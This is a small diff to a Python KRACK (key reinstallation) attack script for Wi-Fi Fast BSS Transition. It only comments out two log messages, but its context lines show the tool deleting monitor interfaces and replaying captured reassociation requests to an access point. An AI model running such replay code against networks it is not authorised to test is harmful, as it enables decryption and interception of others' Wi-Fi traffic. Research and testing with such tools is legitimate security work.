@@ -250,7 +250,7 @@ class KRAckAttackFt():
 
 
 	def configure_interfaces(self):
-		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")
+		#log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")
 
 		# 1. Remove unused virtual interfaces to start from a clean state
 		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -278,7 +278,7 @@ class KRAckAttackFt():
 			if self.sock in sel[0]: self.handle_rx()
 
 			if self.reassoc and time.time() > self.next_replay:
-				log(INFO, "Replaying Reassociation Request")
+				#log(INFO, "Replaying Reassociation Request")
 				self.sock.send(self.reassoc)
 				self.next_replay = time.time() + 1
 
